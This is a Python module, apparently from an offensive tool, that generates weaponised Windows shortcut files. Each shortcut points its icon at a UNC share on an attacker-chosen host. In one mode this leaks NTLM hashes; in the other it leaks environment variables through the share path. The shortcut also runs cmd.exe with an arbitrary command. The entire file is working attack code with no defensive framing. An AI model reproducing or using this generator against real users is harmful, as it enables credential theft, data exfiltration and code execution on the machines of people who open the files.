from __future__ import annotations

import random
import sys
from pathlib import Path

from .models import GeneratedLnk, LnkSpec, PayloadType
from .validation import validate_spec


def build_icon_location(spec: LnkSpec) -> str:
    nonce = random.SystemRandom().randint(0, 50000)
    if spec.payload_type is PayloadType.NTLM:
        return rf"\\{spec.host}\Share\{nonce}.ico"
    path = "_".join(f"%{name}%" for name in spec.environment_variables)
    return rf"\\{spec.host}\Share_{path}\{nonce}.ico"


def generate_lnk(spec: LnkSpec) -> GeneratedLnk:
    validate_spec(spec)
    icon = build_icon_location(spec)
    arguments = "/c " + spec.execute
    output = spec.output.expanduser().resolve()

    if sys.platform.startswith("win"):
        _generate_windows(output, icon, arguments)
    else:
        _generate_pylnk3(output, icon, arguments)

    return GeneratedLnk(output=output, icon_location=icon, arguments=arguments)


def _generate_windows(output: Path, icon: str, arguments: str) -> None:
    try:
        import win32com.client  # type: ignore
    except ImportError as exc:
        raise RuntimeError("pywin32 is required on Windows") from exc

    shell = win32com.client.Dispatch("WScript.Shell")
    link = shell.CreateShortcut(str(output))
    link.TargetPath = r"C:\Windows\System32\cmd.exe"
    link.Arguments = arguments
    link.IconLocation = icon
    link.WorkingDirectory = r"C:\Windows\System32"
    link.Save()


def _generate_pylnk3(output: Path, icon: str, arguments: str) -> None:
    try:
        import pylnk3  # type: ignore
    except ImportError as exc:
        raise RuntimeError(
            "pylnk3 is required for LNK generation on non-Windows systems"
        ) from exc

    pylnk3.for_file(
        target_file=r"C:\Windows\System32\cmd.exe",
        lnk_name=str(output),
        arguments=arguments,
        icon_file=icon,
        work_dir=r"C:\Windows\System32",
    )
